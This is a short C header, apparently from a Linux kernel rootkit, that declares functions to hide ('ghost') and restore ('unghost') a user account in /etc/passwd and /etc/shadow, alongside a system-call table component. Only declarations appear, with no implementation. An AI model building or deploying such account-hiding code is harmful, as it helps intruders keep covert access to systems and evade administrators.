#ifndef GHOST_H
#define GHOST_H

#include <linux/err.h>
#include <linux/errno.h>

#include "sctm.h"

/* hide/show a user in "/etc/passwd" and "/etc/shadow" */

/* remove a user from "/etc/passwd" and "/etc/shadow" */
int ghost(const uid_t uid);

int ghost_exit(void);

int ghost_init(struct sctm *sctm);

/* restore a user in "/etc/passwd" and "/etc/shadow" */
int unghost(const uid_t uid);

#endif

